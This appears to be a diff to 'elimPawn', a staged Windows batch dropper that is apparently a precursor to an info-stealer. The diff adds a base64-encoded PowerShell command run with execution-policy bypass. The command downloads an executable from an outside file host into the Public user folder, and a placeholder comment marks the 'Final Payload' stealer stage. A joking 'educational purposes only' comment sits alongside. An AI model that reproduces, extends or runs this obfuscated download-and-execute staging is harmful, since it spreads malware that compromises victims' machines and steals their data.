@@ -1,6 +1,6 @@
 @echo off
 cls
-
+:: Educational purposes only :^)
 
 
 echo [elimPawn] Stage 0 ; IP Check Via ASN
@@ -64,5 +64,10 @@ powershell -exec bypass -encodedCommand UQBRAEIAawBBAEcAUQBBAEwAUQBCAE4AQQBIAEEA
 
 echo.&echo.
 echo [elimPawn] Stage 3 ; EnvCheck
-::powershell -exec bypass -encodedCommand
-::Our python script will go here :)
+powershell -exec bypass -encodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgACcAaAB0AHQAcABzADoALwAvAGMAZABuADMALgBmAGkAbABlAGgAYQB1AHMALgBzAHUALwBmAGkAbABlAHMALwAxADcAMgAyADIAOQAwADQANQA3AF8AMgAyADcAOAAwAC8AZQBsAGkAbQBQAGEAdwBuAF8AZQBuAHYAQwBoAGUAYwBrAC4AZQB4AGUAJwAgACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABlAG4AdgBDAGgAZQBjAGsALgBlAHgAZQAnAA==
+
+
+
+echo.&echo.
+echo [elimPawn] Stage 4 ; Final Payload
+:: This is where our final payload of elimPawn will go, running the stealer :^)
